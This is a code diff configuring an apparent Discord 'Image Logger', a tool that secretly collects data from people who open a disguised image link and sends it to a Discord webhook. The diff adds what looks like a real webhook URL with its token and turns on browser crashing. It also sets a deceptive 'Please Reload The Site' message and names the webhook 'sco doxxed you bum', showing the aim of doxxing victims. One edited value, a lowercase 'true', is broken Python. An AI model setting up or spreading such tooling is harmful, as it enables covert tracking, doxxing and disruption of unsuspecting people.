@@ -12,23 +12,23 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2",
+    "image": "https://cdn.discordapp.com/attachments/1323481519465168976/1336540335865856062/lowquality1738726418137.png?ex=67a42daf&is=67a2dc2f&hm=bcd01901f95e20f6acf3fa4167e90fd5d26b643d2e1bdb43e54e6f479f354b3c&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "sco doxxed you bum ⭐", # Set this to the name you want the webhook to have
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": true, # Enable the custom message?
+        "message": "Please Reload The Site", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
